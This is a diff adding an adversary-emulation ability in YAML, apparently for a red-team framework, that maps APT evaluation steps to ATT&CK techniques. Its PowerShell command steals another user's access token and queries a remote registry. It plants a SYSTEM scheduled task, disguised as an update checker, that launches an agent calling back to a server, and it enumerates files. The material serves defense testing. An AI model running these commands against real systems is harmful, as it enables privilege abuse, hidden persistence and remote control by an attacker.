@@ -1,0 +1,26 @@
+---
+
+- id: 03afada1-1714-408f-bde5-f528b91dc89d
+  name: >-
+    5.B.1 - Access Token Manipulation (T1134),
+    6.A.1 - Query Registry (T1012),
+    7.B.1 - Remote File Copy (T1105),
+    7.C.1 - Scheduled Tasks (T1053),
+    8.A.1/2 - File and Directory Discovery (T1083)
+  description: A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1134
+    name: Access Token Manipulation (T1134)
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\StealToken.ps1 -Verbose -Force;
+          StealToken;
+          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
+          CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
+          CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
+          CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
+          RevertToSelf;
+        payload: StealToken.ps1,sandcat.go-windows
